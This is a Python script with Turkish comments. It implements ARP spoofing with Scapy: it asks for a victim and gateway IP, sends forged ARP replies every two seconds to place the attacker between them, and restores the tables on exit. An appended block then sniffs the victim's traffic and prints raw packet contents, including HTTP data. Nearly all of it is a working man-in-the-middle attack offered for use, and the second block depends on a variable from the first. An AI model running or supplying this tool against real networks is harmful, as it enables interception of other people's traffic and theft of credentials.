from scapy.all import *
import time
import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac(ip):
    """Verilen IP adresinin MAC adresini ARP isteği ile alır."""
    # Ethernet katmanı: Broadcast (FF:FF:FF:FF:FF:FF) hedef MAC
    # ARP katmanı: MAC'ini öğrenmek istediğimiz IP (pdst)
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    # srp: Katman 2'de gönderip yanıt bekliyoruz (answered: yanıtlar)
    response = srp1(arp_request, timeout=1, verbose=0)

    if response:
        return response.hwsrc  # Yanıtın kaynak MAC adresi


def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """Hedef ve Yönlendiriciye sahte ARP yanıtları gönderir."""

    # 1. Kurbana Gönderilen Paket: Yönlendiricinin MAC adresi benim (Saldırganın) de
    # op=2 (ARP Reply), psrc (Yönlendiricinin IP'si) benim (Saldırganın) MAC'imden geliyor gibi
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

    # 2. Yönlendiriciye Gönderilen Paket: Kurbanın MAC adresi benim (Saldırganın) de
    # op=2 (ARP Reply), psrc (Kurbanın IP'si) benim (Saldırganın) MAC'imden geliyor gibi
    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    # Gönderme (broadcast değil, sadece hedeflere gönderiliyor)
    send(packet1, verbose=0)
    send(packet2, verbose=0)


def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Ağdaki ARP tablolarını gerçek MAC adresleriyle eski haline getirir."""

    # 1. Kurbana Gönderilen Paket: Gerçek Yönlendirici MAC'i
    # hwsrc (Yönlendiricinin MAC'i), psrc (Yönlendiricinin IP'si)
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac, psrc=gateway_ip)

    # 2. Yönlendiriciye Gönderilen Paket: Gerçek Kurban MAC'i
    # hwsrc (Kurbanın MAC'i), psrc (Kurbanın IP'si)
    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac, psrc=target_ip)

    # Gerçek paketleri 4 kez gönder (güvenilir olması için)
    send(packet1, count=4, verbose=0)
    send(packet2, count=4, verbose=0)


# --- ANA SCRIPT ---
if __name__ == "__main__":

    # Kullanıcıdan IP'leri al
    target_ip = input("Kurbanın IP Adresi: ")
    gateway_ip = input("Yönlendiricinin/Router'ın IP Adresi: ")

    # MAC adreslerini öğren
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("Hata: MAC adresleri alınamadı. IP adreslerini kontrol edin veya cihazların aktif olduğundan emin olun.")
        sys.exit()

    print(f"\nKurban MAC: {target_mac}")
    print(f"Router MAC: {gateway_mac}")
    print("\nARP Sahteciliği Başlatılıyor... (Çıkmak için Ctrl+C)")

    # ARP tablolarını eski haline getirmek için try/finally kullandık
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            sent_packets_count += 2
            print(f"\rGönderilen ARP Paketleri: {sent_packets_count}", end="")
            time.sleep(2)  # Her 2 saniyede bir paket gönder

    except KeyboardInterrupt:
        print("\nSahtecilik Durduruluyor...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        print("ARP Tabloları eski haline getirildi. IP Yönlendirmeyi (ip_forward) kapatmayı unutmayın.")
        sys.exit()



#ARP Spoofing başarılı olduktan sonra, kurban ile yönlendirici arasındaki tüm trafik sizin makinenizden geçer.
#Bu aşamada Scapy'nin rolü biter ve ağ güvenliği araçları devreye girer.

from scapy.all import *

def packet_callback(packet):
    # Eğer pakette HTTP (Katman 7) varsa
    if packet.haslayer(Raw):
        # Paketin ham verisini ekrana yazdır
        print(packet[Raw].load.decode(errors='ignore'))

# Kurbanın IP adresini filtreleyerek sadece onun trafiğini yakala
print("Trafik Dinleniyor...")
sniff(filter=f"host {target_ip}", prn=packet_callback, store=0)